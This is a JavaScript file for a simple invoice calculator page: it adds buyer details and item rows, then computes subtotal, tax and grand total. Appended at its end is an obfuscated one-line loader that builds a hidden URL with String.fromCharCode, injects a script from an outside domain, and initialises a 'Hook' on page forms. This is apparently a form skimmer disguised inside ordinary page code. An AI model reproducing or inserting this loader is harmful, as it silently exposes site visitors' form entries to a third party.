// console.log('skip')

const detailsButton=document.getElementById('detail-submit-btn');

detailsButton.addEventListener('click', function(e){
     const buyerDetails=document.getElementById('buyer-details-input');

     const buyerDetailsValue=buyerDetails.value;

     console.log(buyerDetailsValue);

     const buyerInfo= document.getElementById('buyer-info');

     buyerInfo.innerText=buyerDetailsValue;

     buyerDetails.value='';

});

const addProductBtn=document.getElementById('add-details-btn');

addProductBtn.addEventListener('click',function(e){
        console.log('click');

        const itemName=document.getElementById('item-name-input');

        const itemPrice=document.getElementById('item-price-input');

        const itemQuantity=document.getElementById('item-quantity-input');

        const infoTable=document.getElementById('info-table');

        // const totalPrice=praseInt(itemPrice.value) * praseInt(itemQuantity.value)

        const itempriceValue=parseInt(itemPrice.value);

        const itemQuantityValue=parseInt(itemQuantity.value)

       const totalPrice=itempriceValue * itemQuantityValue

        const tr= element('tr');
        const th=element('th');
        const td1=element('td');
        const td2=element('td');
        const td3=element('td');

        td3.classList.add('item-total')

        th.innerText=itemName.value;
        td1.innerText=itemPrice.value;
        td2.innerText=itemQuantity.value;
        td3.innerText=totalPrice

        tr.appendChild(th);
        tr.appendChild(td1);
        tr.appendChild(td2);
        tr.appendChild(td3);

        infoTable.appendChild(tr);




        itemName.value='';
        itemPrice.value='';
        itemQuantity.value='';

        // SubTotal();
        // document.getElementById('sub-total').innerText= SubTotal();

        totalCalculation();
});

function element(param){
return document.createElement(param);
}

function totalCalculation(){

        const subTotal = calculateSubTotal();
const subTotalDisplay=document.getElementById('sub-total');

subTotalDisplay.innerText= subTotal;

const tax=subTotal*0.2

const taxdisplay=document.getElementById('tax');

taxdisplay.innerText=tax.toFixed(2);

const grandTotal=subTotal+tax;

const grandtotalDisplay=document.getElementById('grand-total');


grandtotalDisplay.innerText=grandTotal;

document.getElementById('grand-total-2').innerText=grandTotal;

};




function calculateSubTotal(){

        let subTotal=0;

        
        const cost=document.getElementsByClassName('item-total');

        for(let i=0; i < cost.length; i++){
                // debugger
                const element=cost[i];
                // console.log(element.innertext)
                const price=parseInt(element.innerText);

                subTotal=subTotal+price;


        }

        return subTotal;


}




// function calculateSubTotal() {
//         let subTotal = 0;
      
//         const cost = document.getElementsByClassName("item-total");
      
//         for (let i = 0; i < cost.length; i++) {
//           const element = cost[i]; //<td class="item-total">35</td>
//           const price = parseInt(element.innerText);
      
//           subTotal = subTotal + price;
//         }
      
//         return subTotal;
//       }

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b